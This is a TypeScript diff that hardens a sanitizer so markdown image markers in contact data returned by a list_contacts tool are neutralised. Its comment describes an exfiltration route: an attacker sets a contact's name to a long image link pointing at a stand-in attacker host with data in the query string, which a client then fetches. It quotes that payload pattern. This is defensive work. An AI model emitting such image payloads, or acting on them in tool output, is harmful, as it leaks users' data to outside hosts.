@@ -275,6 +275,30 @@ export function defuseAutoFetch(text: string): string {
         (_match, alt: string) =>
           `[inline image removed — not fetched. alt="${alt}"]`
       )
+      // Last line, and the one that actually closes the hole: anything still
+      // carrying the `![` marker.
+      //
+      // The three rules above are the *informative* ones — they name the alt text
+      // and the URL they took apart, which is what makes a defused card readable.
+      // Every one of them needs a closing `]` within 200 characters, so an alt
+      // text longer than that, or one containing a `]` of its own, or a reference
+      // nothing ever terminates, walked past all three and reached the renderer
+      // intact: 250 filler characters and the whole
+      // `![…](https://attacker/x.png?d=…)` came back through `list_contacts` in
+      // both channels. Anyone who can write to a shared address book can set
+      // `FN`, and `FN` is the field a listing shows first.
+      //
+      // The bound is not the bug and must not be removed. `[^\]]` with no upper
+      // limit backtracks over the whole remaining string at every start position
+      // once there is no `]` to find, so a note full of `![` turns quadratic —
+      // measured: half a megabyte did not finish in two minutes, where the
+      // bounded version is linear. So the informative rules keep their 200, and
+      // this rule carries no length at all *because it needs none*: it matches
+      // two literal characters, which is O(n) whatever follows them.
+      //
+      // `[` on its own fetches nothing. It is the `!` in front of it that sends a
+      // client to the network, so neutralising the marker is the whole job.
+      .replace(/!\[/g, '[inline image marker removed] [')
   );
 }
 
